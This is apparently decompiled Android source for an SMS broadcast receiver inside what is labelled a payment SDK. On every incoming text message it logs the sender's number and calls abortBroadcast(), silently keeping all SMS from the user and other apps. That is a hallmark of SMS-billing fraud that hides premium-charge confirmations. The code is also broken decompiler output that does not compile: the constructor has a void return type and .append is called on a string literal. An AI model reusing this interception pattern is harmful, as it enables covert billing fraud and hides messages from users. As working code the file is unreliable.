package com.uc.paymentsdk.payment.sms.receiver.SmsReceiver;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import java.lang.String;
import java.lang.Object;
import android.telephony.gsm.SmsMessage;
import java.lang.StringBuilder;
import android.util.Log;

public class SmsReceiver extends BroadcastReceiver	// class@0000b9 from classes.dex
{

    public void SmsReceiver(){
       super();
    }
    public void onReceive(Context paramContext,Intent paramIntent){
       Bundle localBundle;
       if ((localBundle = paramIntent.getExtras()) != null) {
          Object[] objArray = localBundle.get("pdus");
          for (int i = 0; i < objArray.length; i++) {
             SmsMessage localSmsMessage = SmsMessage.createFromPdu(objArray[i]);
             String str = localSmsMessage.getOriginatingAddress();
             Log.i("pay", "receiver number:".append(str).toString());
             this.abortBroadcast();
          }
       }
       return;
    }
}
